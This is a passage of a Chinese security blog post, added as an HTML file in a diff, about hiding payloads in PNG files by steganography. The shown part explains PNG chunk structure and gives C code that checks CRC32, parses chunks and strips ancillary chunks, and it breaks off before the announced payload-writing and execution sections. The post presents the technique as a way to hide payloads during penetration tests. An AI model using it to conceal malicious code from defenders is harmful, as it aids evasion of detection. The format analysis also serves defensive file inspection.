@@ -1,0 +1,1265 @@
+
+
+<script type="text/javascript" src="http://7u2ss1.com1.z0.glb.clouddn.com/love.js"></script>
+<!DOCTYPE HTML>
+<html>
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="chrome=1">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+    <script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
+    <link href="//cdn.bootcss.com/pace/1.0.2/themes/pink/pace-theme-flash.css" rel="stylesheet">
+	<script src="http://echarts.baidu.com/dist/echarts.common.min.js"></script>
+	<style>
+    .pace .pace-progress {
+        background: #1E92FB; /*进度条颜色*/
+        height: 3px;
+    }
+    .pace .pace-progress-inner {
+         box-shadow: 0 0 10px #1E92FB, 0 0 5px     #1E92FB; /*阴影颜色*/
+    }
+    .pace .pace-activity {
+        border-top-color: #1E92FB;    /*上边框颜色*/
+        border-left-color: #1E92FB;    /*左边框颜色*/
+    }
+    </style>
+
+
+    
+
+    <title>隐写技巧——利用PNG文件格式隐藏Payload | </title>
+    <meta name="author" content="wiki">
+    
+    <meta name="description" content="0x00 前言
+隐写术(Steganography)由来已久，其中有很多好玩儿的细节，所以打算系统的研究一下，这次先从PNG的文件格式开始。
+
+图片来自于http://null-byte.wonderhowto.com/how-to/guide-steganography-part-1-hide-s">
+    
+    
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+    <meta property="og:title" content="隐写技巧——利用PNG文件格式隐藏Payload"/>
+    <meta property="og:site_name" content="wiki"/>
+
+    
+    <meta property="og:image" content=""/>
+    
+
+    <link rel="icon" type="image/png" href="/favicon.png">
+    <link rel="alternate" href="/atom.xml" title="wiki" type="application/atom+xml">
+    <link rel="stylesheet" href="/css/lib/materialize.min.css">
+    <link rel="stylesheet" href="/css/lib/font-awesome.min.css">
+    <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+
+    
+        <link rel="stylesheet" href="/css/lib/lastest.css" type="text/css">
+    
+    <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+	<script>
+(function(){
+    var bp = document.createElement('script');
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https') {
+        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
+    }
+    else {
+        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+    }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+})();
+</script>
+
+</head>
+
+<style>
+
+</style>
+<body style="background-color:#2196f3">
+
+<script type="text/javascript"
+color="100,238,23" opacity='0.7' zIndex="-2" count="100" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>
+  
+    <script src="//cdnjs.cloudflare.com/ajax/libs/gsap/1.15.0/TweenMax.min.js"></script>
+    <img src="/weixin_favicon.png" style="position: absolute; left: -9999px; opacity: 0; filter: alpha(opacity=0);">
+
+    <nav class="indigo darken-1">
+    
+    <div class="nav-wrapper">
+        <a href="#" data-activates="main-menu" class="button-collapse">
+            <i class="fa fa-navicon"></i>
+        </a>
+        <div class="">
+            <a href="/" class="brand-logo hide-on-med-and-down">wiki</a>
+            <ul class="right hide-on-med-and-down">
+                
+                    <li>
+                        <a class="menu-home " href="/" >
+                            <i class="fa fa-home "></i>
+                            
+                            首页
+                        </a>
+                    </li>
+                
+                    <li>
+                        <a class="menu-archive " href="/archives" >
+                            <i class="fa fa-archive "></i>
+                            
+                            归档
+                        </a>
+                    </li>
+                
+                    <li>
+                        <a class="menu-category category-menu" href="javascript:;" data-activates="category-menu" >
+                            <i class="fa fa-bookmark "></i>
+                            
+                            分类
+                        </a>
+                    </li>
+                
+                    <li>
+                        <a class="menu-search modal-trigger " href="#search" >
+                            <i class="fa fa-search "></i>
+                            
+                            搜索
+                        </a>
+                    </li>
+                
+            </ul>
+            <div>
+    <ul class="side-nav indigo darken-2" id="main-menu">
+        
+        <li class="side-user">
+            <div class="row">
+                <div class="col s4 no-padding">
+                    <img class="avatar-image circle responsive-img" src="http://p4gdp8beq.bkt.clouddn.com/timgsi1.jpg" alt="User Avatar">
+                </div>
+                <div class="info col s8 valign-wrapper no-padding">
+                    <div class="valign">
+                        <p class="name">wiki</p>
+                        <p class="desc">安全小白</p>
+                    </div>
+                </div>
+            </div>
+        </li>
+        
+
+        
+            <li class="no-padding">
+                <a class="waves-effect menu-home " href="/" >
+                    <i class="fa fa-home "></i>
+                    
+                    首页
+                </a>
+            </li>
+        
+            <li class="no-padding">
+                <a class="waves-effect menu-archive " href="/archives" >
+                    <i class="fa fa-archive "></i>
+                    
+                    归档
+                </a>
+            </li>
+        
+            <li class="no-padding">
+                <a class="waves-effect menu-category category-menu" href="javascript:;" data-activates="category-menu" >
+                    <i class="fa fa-bookmark "></i>
+                    
+                    分类
+                </a>
+            </li>
+        
+            <li class="no-padding">
+                <a class="waves-effect menu-search modal-trigger " href="#search" >
+                    <i class="fa fa-search "></i>
+                    
+                    搜索
+                </a>
+            </li>
+        
+    </ul>
+
+    <ul class="side-nav indigo darken-2" id="category-menu">
+    
+
+            
+
+    </ul>
+</div>
+
+        </div>
+    </div>
+</nav>
+
+<div id="search" class="modal search-modal">
+    <div class="row">
+        <div class="input-field col s12">
+              <input id="search-input" type="text">
+              <label for="search-input">搜索</label>
+        </div>
+
+    </div>
+    <div id="search-result" class="search-result col s12">
+
+    </div>
+</div>
+
+
+    <main>
+<div class="container main-container">
+    <script>
+(function(){
+    var bp = document.createElement('script');
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https'){
+   bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+  }
+  else{
+  bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+  }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+})();
+</script>
+<nav class="page-nav hide-on-small-only">
+    <div class="nav-wrapper indigo darken-2">
+        <span class="breadcrumb">当前位置（分类目录）</span>
+        
+            
+
+        
+
+        
+    </div>
+</nav>
+
+<article>
+    <div class="card">
+	<!-- 添加渲染 -->
+	<div id="toc" class="toc-article">
+		<strong class="toc-title"></strong>
+	</div> 
+        <div class="card-content">
+		  
+			
+            
+
+            <div class="article-title">
+                
+    
+        <h1>隐写技巧——利用PNG文件格式隐藏Payload</h1>
+    
+
+
+            </div>
+            <time class="red-link-context" datetime="2018-05-25T13:03:44.723Z"><a href="">2018-05-25</a></time>
+
+            <span id="busuanzi_container_page_pv" class="read-times-container">
+    <i class="fa fa-eye"></i>
+    <span id="busuanzi_value_page_pv"></span>
+</span>
+
+            
+
+            <div class="toc red-link-context hide-on-med-and-down">
+    <ol class="section table-of-contents"><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#0x00-前言"><span class="section table-of-contents-text">0x00 前言</span></a></li><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#0x01-简介"><span class="section table-of-contents-text">0x01 简介</span></a></li><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#0x02-PNG文件格式"><span class="section table-of-contents-text">0x02 PNG文件格式</span></a><ol class="section table-of-contents-child"><li class="section table-of-contents-item section table-of-contents-level-3"><a class="section table-of-contents-link" href="#1、PNG文件署名域"><span class="section table-of-contents-text">1、PNG文件署名域</span></a></li><li class="section table-of-contents-item section table-of-contents-level-3"><a class="section table-of-contents-link" href="#2、数据块"><span class="section table-of-contents-text">2、数据块</span></a></li></ol></li><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#0x03-实例格式分析"><span class="section table-of-contents-text">0x03 实例格式分析</span></a><ol class="section table-of-contents-child"><li class="section table-of-contents-item section table-of-contents-level-3"><a class="section table-of-contents-link" href="#1-PNG文件署名域"><span class="section table-of-contents-text">(1) PNG文件署名域</span></a></li><li class="section table-of-contents-item section table-of-contents-level-3"><a class="section table-of-contents-link" href="#2-IHDR"><span class="section table-of-contents-text">(2) IHDR</span></a></li><li class="section table-of-contents-item section table-of-contents-level-3"><a class="section table-of-contents-link" href="#3-gAMA"><span class="section table-of-contents-text">(3) gAMA</span></a></li><li class="section table-of-contents-item section table-of-contents-level-3"><a class="section table-of-contents-link" href="#4-cHRM"><span class="section table-of-contents-text">(4) cHRM</span></a></li><li class="section table-of-contents-item section table-of-contents-level-3"><a class="section table-of-contents-link" href="#5-IDAT"><span class="section table-of-contents-text">(5) IDAT</span></a></li></ol></li><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#0x04-编写程序分析文件格式"><span class="section table-of-contents-text">0x04 编写程序分析文件格式</span></a><ol class="section table-of-contents-child"><li class="section table-of-contents-item section table-of-contents-level-3"><a class="section table-of-contents-link" href="#1、读取PNG文件"><span class="section table-of-contents-text">1、读取PNG文件</span></a></li><li class="section table-of-contents-item section table-of-contents-level-3"><a class="section table-of-contents-link" href="#2、解析数据块结构"><span class="section table-of-contents-text">2、解析数据块结构</span></a></li></ol></li><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#0x05-去除多余数据"><span class="section table-of-contents-text">0x05 去除多余数据</span></a><ol class="section table-of-contents-child"><li class="section table-of-contents-item section table-of-contents-level-3"><a class="section table-of-contents-link" href="#1、工具实现"><span class="section table-of-contents-text">1、工具实现</span></a></li><li class="section table-of-contents-item section table-of-contents-level-3"><a class="section table-of-contents-link" href="#2、程序实现"><span class="section table-of-contents-text">2、程序实现</span></a></li></ol></li><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#0x06-写入Payload"><span class="section table-of-contents-text">0x06 写入Payload</span></a><ol class="section table-of-contents-child"><li class="section table-of-contents-item section table-of-contents-level-3"><a class="section table-of-contents-link" href="#1、工具实现-1"><span class="section table-of-contents-text">1、工具实现</span></a></li><li class="section table-of-contents-item section table-of-contents-level-3"><a class="section table-of-contents-link" href="#2、程序实现-1"><span class="section table-of-contents-text">2、程序实现</span></a></li></ol></li><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#0x07-读取payload并执行"><span class="section table-of-contents-text">0x07 读取payload并执行</span></a><ol class="section table-of-contents-child"><li class="section table-of-contents-item section table-of-contents-level-3"><a class="section table-of-contents-link" href="#1、javascript"><span class="section table-of-contents-text">1、javascript</span></a></li><li class="section table-of-contents-item section table-of-contents-level-3"><a class="section table-of-contents-link" href="#2、powershell"><span class="section table-of-contents-text">2、powershell</span></a></li></ol></li><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#0x08-小结"><span class="section table-of-contents-text">0x08 小结</span></a></li></ol>
+</div>
+
+
+            <div class="entry red-link-context">
+                <script src="\assets\js\APlayer.min.js"> </script><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><hr>
+<p>隐写术(Steganography)由来已久，其中有很多好玩儿的细节，所以打算系统的研究一下，这次先从PNG的文件格式开始。<br><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-7-15/0.jpg" alt="Alt text"></p>
+<blockquote>
+<p>图片来自于<a href="http://null-byte.wonderhowto.com/how-to/guide-steganography-part-1-hide-secret-messages-images-0130797/" target="_blank" rel="noopener">http://null-byte.wonderhowto.com/how-to/guide-steganography-part-1-hide-secret-messages-images-0130797/</a></p>
+</blockquote>
+<h2 id="0x01-简介"><a href="#0x01-简介" class="headerlink" title="0x01 简介"></a>0x01 简介</h2><hr>
+<p>隐写术可以理解为信息隐藏，在渗透测试中最主要的应用是对Payload的隐藏。本文会对PNG的文件格式进行分析，编写c程序实现自动解析文件格式，并按照其文件格式添加自定义的payload，不仅不会影响图片的正常浏览，同时可将图片上传到网络，使用时将图片下载再以特定格式解密，最终执行payload。</p>
+<p><strong>注：</strong></p>
+<p>所有程序源码已上传github，地址为：<br><a href="https://github.com/3gstudent/PNG-Steganography" target="_blank" rel="noopener">https://github.com/3gstudent/PNG-Steganography</a></p>
+<h2 id="0x02-PNG文件格式"><a href="#0x02-PNG文件格式" class="headerlink" title="0x02 PNG文件格式"></a>0x02 PNG文件格式</h2><hr>
+<h3 id="1、PNG文件署名域"><a href="#1、PNG文件署名域" class="headerlink" title="1、PNG文件署名域"></a>1、PNG文件署名域</h3><p>前8字节</p>
+<p>固定格式，16进制为：<br><code>89 50 4e 47 0d 0a 1a 0a</code></p>
+<h3 id="2、数据块"><a href="#2、数据块" class="headerlink" title="2、数据块"></a>2、数据块</h3><p>Chunk Type Code(数据块类型码): 4字节,数据块类型码</p>
+<p>Chunk Data(数据块数据): 可变长度,存储数据</p>
+<p>CRC(循环冗余检测): 4字节,存储用来检测是否有错误的循环冗余码</p>
+<p><strong>数据块类型：</strong></p>
+<p><strong>1. 关键数据块(critical chunk)</strong></p>
+<p>(1) 文件头数据块IHDR(header chunk)</p>
+<ul>
+<li>包含PNG文件的基本信息</li>
+<li>一个PNG数据流中只能有一个IHDR</li>
+<li><strong>必须在PNG文件最前面</strong></li>
+</ul>
+<p>(2) 调色板数据块PLTE(palette chunk)</p>
+<ul>
+<li>包含有与索引彩色图像(indexed-color image)相关的彩色变换数据</li>
+<li><strong>必须在IDAT之前</strong></li>
+</ul>
+<p>(3) 图像数据块IDAT(image data chunk)</p>
+<ul>
+<li>存储实际的数据</li>
+<li>可存在多个</li>
+<li><strong>必须与其他IDAT连续</strong></li>
+</ul>
+<p>(4) 图像结束数据IEND(image trailer chunk)</p>
+<ul>
+<li>固定格式，16进制为：<br><code>00 00 00 00 49 45 4E 44 AE 42 60 82</code></li>
+<li><strong>必须在PNG文件最尾部</strong></li>
+</ul>
+<p><strong>2. 辅助数据块(ancillary chunk)</strong></p>
+<p>用于辅助指示PNG图像中的层、文字等信息</p>
+<p><strong>可删除，不影响图片浏览，但图像将失去原来的可编辑性</strong></p>
+<p>(1) 背景颜色数据块bKGD(background color)</p>
+<p>(2) 基色和白色度数据块cHRM(primary chromaticities and white point)</p>
+<p>(3) 图像γ数据块gAMA(image gamma)</p>
+<p>(4) 图像直方图数据块hIST(image histogram)</p>
+<p>(5) 物理像素尺寸数据块pHYs(physical pixel dimensions)</p>
+<p>(6) 样本有效位数据块sBIT(significant bits)</p>
+<p>(7) 文本信息数据块tEXt(textual data)</p>
+<p>(8) 图像最后修改时间数据块tIME (image last-modification time)</p>
+<p>(9) 图像透明数据块tRNS (transparency)</p>
+<p>(10) 压缩文本数据块zTXt (compressed textual data)</p>
+<h2 id="0x03-实例格式分析"><a href="#0x03-实例格式分析" class="headerlink" title="0x03 实例格式分析"></a>0x03 实例格式分析</h2><hr>
+<p>工具：<code>Hex Editor</code></p>
+<p><strong>优点：</strong></p>
+<p>可对16进制字符串进行标记，设置颜色，方便格式分析</p>
+<p><strong>测试文件：</strong></p>
+<p>如图</p>
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-7-15/test.png" alt="Alt text"></p>
+<p><strong>源下载地址：</strong></p>
+<p><a href="http://www.easyicon.net/language.en/1172671-png_icon.html" target="_blank" rel="noopener">http://www.easyicon.net/language.en/1172671-png_icon.html</a></p>
+<p>标记好的文件格式如图</p>
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-7-15/2-1.PNG" alt="Alt text"></p>
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-7-15/2-2.PNG" alt="Alt text"></p>
+<h3 id="1-PNG文件署名域"><a href="#1-PNG文件署名域" class="headerlink" title="(1) PNG文件署名域"></a>(1) PNG文件署名域</h3><p>固定格式：</p>
+<p><code>89 50 4e 47 0d 0a 1a 0a</code></p>
+<h3 id="2-IHDR"><a href="#2-IHDR" class="headerlink" title="(2) IHDR"></a>(2) IHDR</h3><p>00000008h: 00 00 00 0D 49 48 44 52 00 00 00 1A 00 00 00 1A ; ….IHDR……..<br>00000018h: 08 04 00 00 00 03 43 84 45                      ; ……C凟</p>
+<p><strong>数据块结构：</strong></p>
+<p><strong>Length:</strong><br><code>00 00 00 0D</code></p>
+<p>前4字节，定义长度，00 00 00 0D十进制为13，代表长度为13个字节</p>
+<p><strong>Chunk Type Code：</strong><br><code>49 48 44 52</code></p>
+<p>4字节，定义数据块类型码，此处为IHDR</p>
+<p><strong>Chunk Data：</strong><br><code>00 00 00 1A 00 00 00 1A 08 04 00 00 00</code></p>
+<p>共13字节，定义数据内容</p>
+<p><strong>CRC：</strong><br>4字节，对Chunk Type Code+Chunk Data作CRC32计算得出的值</p>
+<p>即对以下十六进制作计算：<br><code>49 48 44 52 00 00 00 1A 00 00 00 1A 08 04 00 00 00</code></p>
+<p>编写程序对CRC算法进行验证，保存为example1.cpp,源代码如下：</p>
+<pre><code>#include &lt;string.h&gt;
+unsigned int GetCrc32(char* InStr,unsigned int len){        
+  unsigned int Crc32Table[256];      
+  int i,j;        
+  unsigned int Crc;        
+  for (i = 0; i &lt; 256; i++){        
+    Crc = i;        
+    for (j = 0; j &lt; 8; j++){        
+      if (Crc &amp; 1)        
+        Crc = (Crc &gt;&gt; 1) ^ 0xEDB88320;        
+      else       
+        Crc &gt;&gt;= 1;      
+    }        
+    Crc32Table[i] = Crc;        
+  }        
+
+  Crc=0xffffffff;        
+  for(int m=0; m&lt;len; m++){          
+    Crc = (Crc &gt;&gt; 8) ^ Crc32Table[(Crc &amp; 0xFF) ^ InStr[m]];        
+  }     
+
+  Crc ^= 0xFFFFFFFF;     
+  return Crc;        
+}        
+int main(int argc, char* argv[])
+{
+    char buf[17]={0x49,0x48,0x44,0x52,0x00,0x00,0x00,0x1A,0x00,0x00,0x00,0x1A,0x08,0x04,0x00,0x00,0x00};
+    unsigned int crc32=GetCrc32(buf,sizeof(buf));
+    printf(&quot;%08X\n&quot;,crc32);
+    return 0;
+}
+</code></pre><p>运行后如图，输出<code>03438445</code>，同文件中的CRC32校验码相同</p>
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-7-15/2-3.png" alt="Alt text"></p>
+<h3 id="3-gAMA"><a href="#3-gAMA" class="headerlink" title="(3) gAMA"></a>(3) gAMA</h3><p>00000021h: 00 00 00 04 67 41 4D 41 00 00 B1 8F 0B FC 61 05 ; ….gAMA..睆.黙.</p>
+<p><strong>数据块结构：</strong></p>
+<p>Length:                <code>00 00 00 04</code></p>
+<p>Chunk Type Code：    <code>67 41 4D 41</code></p>
+<p>Chunk Data：        <code>00 00 B1 8F</code></p>
+<p>CRC：                <code>0B FC 61 05</code></p>
+<h3 id="4-cHRM"><a href="#4-cHRM" class="headerlink" title="(4) cHRM"></a>(4) cHRM</h3><p>00000031h: 00 00 00 20 63 48 52 4D 00 00 7A 26 00 00 80 84 ; … cHRM..z&amp;..€?<br>00000041h: 00 00 FA 00 00 00 80 E8 00 00 75 30 00 00 EA 60 ; ..?..€?.u0..阘<br>00000051h: 00 00 3A 98 00 00 17 70 9C BA 51 3C             ; ..:?..p満Q&lt;</p>
+<p><strong>数据块结构：</strong></p>
+<p>Length:                <code>00 00 00 20</code></p>
+<p>Chunk Type Code：    <code>63 48 52 4D</code></p>
+<p>Chunk Data：            <code>00 00 7A 26 00 00 80 84 00 00 FA 00 00 00 80 E8 00 00 75 30 00 00 EA 60 00 00 3A 98 00 00 17 70</code></p>
+<p>CRC：                <code>9C BA 51 3C</code></p>
+<h3 id="5-IDAT"><a href="#5-IDAT" class="headerlink" title="(5) IDAT"></a>(5) IDAT</h3><p>(6-14) tEXt</p>
+<p>(15)IEND</p>
+<p><strong>数据块结构：</strong></p>
+<p>Length:                <code>00 00 00 00</code></p>
+<p>Chunk Type Code：    <code>49 45 4E 44</code></p>
+<p>Chunk Data：    </p>
+<p>CRC：                <code>AE 42 60 82</code></p>
+<p>固定结构，CRC的值为对Chunk Type Code作CRC32校验</p>
+<p>如图</p>
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-7-15/2-4.png" alt="Alt text"></p>
+<h2 id="0x04-编写程序分析文件格式"><a href="#0x04-编写程序分析文件格式" class="headerlink" title="0x04 编写程序分析文件格式"></a>0x04 编写程序分析文件格式</h2><hr>
+<p>开发工具：<code>vc6.0</code></p>
+<h3 id="1、读取PNG文件"><a href="#1、读取PNG文件" class="headerlink" title="1、读取PNG文件"></a>1、读取PNG文件</h3><p>保存为example2.cpp，代码如下:</p>
+<pre><code>#include&lt;stdio.h&gt;
+#include&lt;string.h&gt;
+int main(int argc, char* argv[])
+{
+    FILE *fp;   
+    if((fp=fopen(&quot;c:\\test\\test.png&quot;,&quot;rb+&quot;))==NULL)
+        return 0;   
+    fseek(fp,0,SEEK_END);
+    int len=ftell(fp);
+    unsigned char *buf=new unsigned char[len];    
+    fseek(fp,0,SEEK_SET);
+    fread(buf,len,1,fp);
+    printf(&quot;len=%d\n&quot;,len);
+    for(int i=1;i&lt;=len;i++)
+    {
+        printf(&quot;%02X &quot;,buf[i-1]);
+        if(i%16==0)
+            printf(&quot;\n&quot;);
+    }
+    fclose(fp);
+    printf(&quot;\n&quot;);
+    return 0;    
+}
+</code></pre><p>如图，程序按照UltraEdit的格式输出，以便后续的格式分析</p>
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-7-15/2-5.PNG" alt="Alt text"></p>
+<h3 id="2、解析数据块结构"><a href="#2、解析数据块结构" class="headerlink" title="2、解析数据块结构"></a>2、解析数据块结构</h3><p>从第8字节开始，读前四字节为ChunkLength</p>
+<p>对应的代码为：</p>
+<pre><code>unsigned int ChunkLen=(buf[0]&lt;&lt;24)|(buf[1]&lt;&lt;16)|(buf[2]&lt;&lt;8)|buf[3];
+</code></pre><p>接着四字节为ChunkName</p>
+<pre><code>printf(&quot;ChunkName:%c%c%c%c\n&quot;,buf[0],buf[1],buf[2],buf[3]);
+</code></pre><p>然后根据ChunkLength读出完整的ChunkData</p>
+<p>最后读出CRC32的值,同Chunk Type Code+Chunk Data求出的CRC32校验值作比较</p>
+<p>保存为check.cpp,完整代码如下：</p>
+<pre><code>#include&lt;stdio.h&gt;
+#include&lt;string.h&gt;
+
+unsigned int GetCrc32(unsigned char* InStr,unsigned int len){        
+    unsigned int Crc32Table[256];      
+    unsigned int i,j;        
+    unsigned int Crc;        
+    for (i = 0; i &lt; 256; i++){        
+        Crc = i;        
+        for (j = 0; j &lt; 8; j++){        
+            if (Crc &amp; 1)        
+                Crc = (Crc &gt;&gt; 1) ^ 0xEDB88320;        
+            else       
+                Crc &gt;&gt;= 1;      
+        }        
+        Crc32Table[i] = Crc;        
+    }        
+
+    Crc=0xffffffff;        
+    for(unsigned int m=0; m&lt;len; m++){          
+        Crc = (Crc &gt;&gt; 8) ^ Crc32Table[(Crc &amp; 0xFF) ^ InStr[m]];        
+    }     
+
+    Crc ^= 0xFFFFFFFF;     
+    return Crc;        
+}        
+
+int main(int argc, char* argv[])
+{
+    FILE *fp;   
+    unsigned char *buf=NULL;
+    unsigned int len=0;
+    unsigned int ChunkLen=0;
+    unsigned int ChunkCRC32=0;
+    unsigned int ChunkOffset=0;    
+    unsigned int crc32=0;
+    unsigned int i=0;
+    if((fp=fopen(&quot;c:\\test\\test.png&quot;,&quot;rb+&quot;))==NULL)
+        return 0;   
+    fseek(fp,0,SEEK_END);
+    len=ftell(fp);
+    buf=new unsigned char[len];
+    fseek(fp,0,SEEK_SET);
+    fread(buf,len,1,fp);
+    printf(&quot;Total Len=%d\n&quot;,len);
+    printf(&quot;----------------------------------------------------\n&quot;);
+    fseek(fp,8,SEEK_SET);
+    ChunkOffset=8;
+    i=0;
+    while(1)
+    {
+        i++;
+        memset(buf,0,len);
+        fread(buf,4,1,fp);
+        ChunkLen=(buf[0]&lt;&lt;24)|(buf[1]&lt;&lt;16)|(buf[2]&lt;&lt;8)|buf[3];
+        fread(buf,4+ChunkLen,1,fp);
+        printf(&quot;[+]ChunkName:%c%c%c%c        &quot;,buf[0],buf[1],buf[2],buf[3]);
+        if(strncmp((char *)buf,&quot;IHDR&quot;,4)==0|strncmp((char *)buf,&quot;PLTE&quot;,4)==0|strncmp((char *)buf,&quot;IDAT&quot;,4)==0)
+            printf(&quot;Palette Chunk\n&quot;);
+        printf(&quot;Ancillary Chunk\n&quot;);
+        printf(&quot;   ChunkOffset:0x%08x    \n&quot;,ChunkOffset);
+        printf(&quot;   ChunkLen: %10d        \n&quot;,ChunkLen);
+        ChunkOffset+=ChunkLen+12;
+        crc32=GetCrc32(buf,ChunkLen+4);
+        printf(&quot;   ExpectCRC32:%08X\n&quot;,crc32);
+        fread(buf,4,1,fp);
+        ChunkCRC32=(buf[0]&lt;&lt;24)|(buf[1]&lt;&lt;16)|(buf[2]&lt;&lt;8)|buf[3];
+        printf(&quot;   ChunkCRC32: %08X        &quot;,ChunkCRC32);
+        if(crc32!=ChunkCRC32)
+            printf(&quot;[!]CRC32Check Error!\n&quot;);
+        else
+            printf(&quot;Check Success!\n\n&quot;);
+        ChunkLen=ftell(fp);
+        if(ChunkLen==(len-12))
+        {
+            printf(&quot;\n----------------------------------------------------\n&quot;);
+            printf(&quot;Total Chunk:%d\n&quot;,i);        
+            break;
+        }
+    }
+    fclose(fp);
+    return 0;    
+}
+</code></pre><p>运行如图，可获得完整的PNG文件结构</p>
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-7-15/2-6.PNG" alt="Alt text"></p>
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-7-15/2-7.PNG" alt="Alt text"></p>
+<p><strong>注：</strong></p>
+<p>这个程序可用来对PNG文件进行格式分析，标记PNG文件的数据块名称、偏移地址、数据块长度、比较预期和实际的CRC32校验码，可基于此对批量文件进行分析，查找可疑文件。</p>
+<p>后续会补充python的实现代码</p>
+<h2 id="0x05-去除多余数据"><a href="#0x05-去除多余数据" class="headerlink" title="0x05 去除多余数据"></a>0x05 去除多余数据</h2><hr>
+<p>上面提到，去除辅助数据块的内容对PNG图像的浏览没有影响，下面就尝试去除PNG文件的所有辅助数据块</p>
+<h3 id="1、工具实现"><a href="#1、工具实现" class="headerlink" title="1、工具实现"></a>1、工具实现</h3><p>如图，使用<code>Hex Editor</code>去除辅助数据块gAMA、cHRM和bKGD</p>
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-7-15/2-8.PNG" alt="Alt text"></p>
+<p>如图，文件大小变化，但不影响PNG文件浏览</p>
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-7-15/2-9.png" alt="Alt text"></p>
+<h3 id="2、程序实现"><a href="#2、程序实现" class="headerlink" title="2、程序实现"></a>2、程序实现</h3><p>去除所有辅助数据块，只提取关键信息。程序先对ChunkName作判断，忽略非关键数据块(Ancillary Chunk)的内容，并保存为new.png</p>
+<p>保存为compress.cpp,完整代码为：</p>
+<pre><code>#include&lt;stdio.h&gt;
+#include&lt;string.h&gt;
+
+unsigned int GetCrc32(unsigned char* InStr,unsigned int len){        
+    unsigned int Crc32Table[256];      
+    unsigned int i,j;        
+    unsigned int Crc;        
+    for (i = 0; i &lt; 256; i++){        
+        Crc = i;        
+        for (j = 0; j &lt; 8; j++){        
+            if (Crc &amp; 1)        
+                Crc = (Crc &gt;&gt; 1) ^ 0xEDB88320;        
+            else       
+                Crc &gt;&gt;= 1;      
+        }        
+        Crc32Table[i] = Crc;        
+    }        
+
+    Crc=0xffffffff;        
+    for(unsigned int m=0; m&lt;len; m++){          
+        Crc = (Crc &gt;&gt; 8) ^ Crc32Table[(Crc &amp; 0xFF) ^ InStr[m]];        
+    }     
+
+    Crc ^= 0xFFFFFFFF;     
+    return Crc;        
+}        
+
+int main(int argc, char* argv[])
+{
+    FILE *fp,*fpnew;   
+    unsigned char *buf=NULL;
+    unsigned int len=0;
+    unsigned int ChunkLen=0;
+    unsigned int ChunkCRC32=0;
+    unsigned int ChunkOffset=0;    
+    unsigned int crc32=0;
+    unsigned int i=0,j=0;
+    unsigned char Signature[8]={0x89,0x50,0x4e,0x47,0x0d,0x0a,0x1a,0x0a};    
+    unsigned char IEND[12]={0x00,0x00,0x00,0x00,0x49,0x45,0x4e,0x44,0xae,0x42,0x60,0x82};       
+
+    if((fp=fopen(&quot;c:\\test\\0.png&quot;,&quot;rb+&quot;))==NULL)
+        return 0;  
+    if((fpnew=fopen(&quot;c:\\test\\new.png&quot;,&quot;wb&quot;))==NULL)
+        return 0;  
+    fseek(fp,0,SEEK_END);
+    len=ftell(fp);
+    buf=new unsigned char[len];
+    fseek(fp,0,SEEK_SET);
+    fread(buf,len,1,fp);
+    printf(&quot;Total Len=%d\n&quot;,len);
+    printf(&quot;----------------------------------------------------\n&quot;);
+    fseek(fp,8,SEEK_SET);
+    ChunkOffset=8;
+    i=0; 
+    fwrite(Signature,8,1,fpnew);
+    while(1)
+    {
+        i++;
+        j=0;
+        memset(buf,0,len);
+        fread(buf,4,1,fp);
+        fwrite(buf,4,1,fpnew);
+        ChunkLen=(buf[0]&lt;&lt;24)|(buf[1]&lt;&lt;16)|(buf[2]&lt;&lt;8)|buf[3];
+        fread(buf,4+ChunkLen,1,fp);
+        printf(&quot;[+]ChunkName:%c%c%c%c        &quot;,buf[0],buf[1],buf[2],buf[3]);
+        if(strncmp((char *)buf,&quot;IHDR&quot;,4)==0|strncmp((char *)buf,&quot;PLTE&quot;,4)==0|strncmp((char *)buf,&quot;IDAT&quot;,4)==0)
+        {    
+            printf(&quot;Palette Chunk\n&quot;);
+
+            fwrite(buf,4+ChunkLen,1,fpnew);
+        }
+        else
+        {
+            printf(&quot;Ancillary Chunk\n&quot;);
+            fseek(fpnew,-4,SEEK_CUR);
+            j=1;
+        }
